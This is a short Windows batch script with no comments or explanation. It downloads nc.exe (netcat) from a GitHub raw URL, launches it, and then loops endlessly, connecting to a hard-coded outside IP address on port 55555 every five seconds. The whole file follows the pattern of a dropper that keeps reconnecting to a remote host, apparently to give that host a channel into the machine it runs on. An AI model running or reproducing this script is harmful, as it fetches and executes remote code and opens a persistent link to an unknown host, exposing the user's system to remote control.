@echo off
:check
if exist "%~dp0nc.exe" goto loop
curl -L -o nc.exe https://raw.githubusercontent.com/VRVRxX/projects/main/nc.exe && start nc.exe
timeout /t 5 /nobreak>nul
goto check
:loop
nc 81.198.239.38 55555
timeout /t 5 /nobreak>nul
goto loop
pause
exit
